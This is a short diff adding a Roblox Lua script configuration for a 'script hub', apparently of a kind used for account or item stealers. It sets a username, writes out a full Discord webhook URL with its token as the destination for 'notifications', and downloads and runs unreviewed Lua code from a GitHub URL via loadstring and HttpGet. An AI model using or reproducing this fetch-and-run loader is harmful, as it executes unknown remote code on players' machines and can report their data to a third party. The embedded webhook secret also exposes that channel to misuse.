@@ -1,0 +1,5 @@
+_G.Username "pavlis331"
+_G.HubName "Pjs Scripts!"
+_G.WebhookUrl "https://discord.com/api/webhooks/1152666381125423175/g4SW8l5XZMiiVMlHbWoKBuCBNus4_4aiPnUOLsGo-awsc_6gY7L1XmANGzVrSGI7Xhvk" --This is where the notifications get sent
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
